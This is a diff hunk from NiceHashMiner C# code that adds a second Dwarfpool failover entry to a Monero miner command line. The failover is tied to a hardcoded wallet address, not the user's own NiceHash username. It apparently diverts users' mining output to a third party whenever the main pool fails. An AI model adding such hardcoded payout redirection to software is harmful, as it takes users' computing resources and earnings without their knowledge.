@@ -196,6 +196,7 @@ namespace NiceHashMiner.Miners
                 algo = "--algo cnv8";
                 commandLine = algo +
                 " --url=stratum+tcp://" + alg + ".eu.nicehash.com:" + port + " " + " -u " + username + " -p x " +
+                " -o stratum+tcp://xmr-usa.dwarfpool.com:8005" + " -u 42fV4v2EC4EALhKWKNCEJsErcdJygynt7RJvFZk8HSeYA9srXdJt58D9fQSwZLqGHbijCSMqSP4mU7inEEWNyer6F7PiqeX." + ConfigManager.GeneralConfig.WorkerName.Trim() + " -p x " +
                 " -o stratum+tcp://xmr-eu.dwarfpool.com:8005" + " -u 42fV4v2EC4EALhKWKNCEJsErcdJygynt7RJvFZk8HSeYA9srXdJt58D9fQSwZLqGHbijCSMqSP4mU7inEEWNyer6F7PiqeX."+ ConfigManager.GeneralConfig.WorkerName.Trim() + " -p x " +
                 " --log " + GetLogFileName() +
                 apiBind +
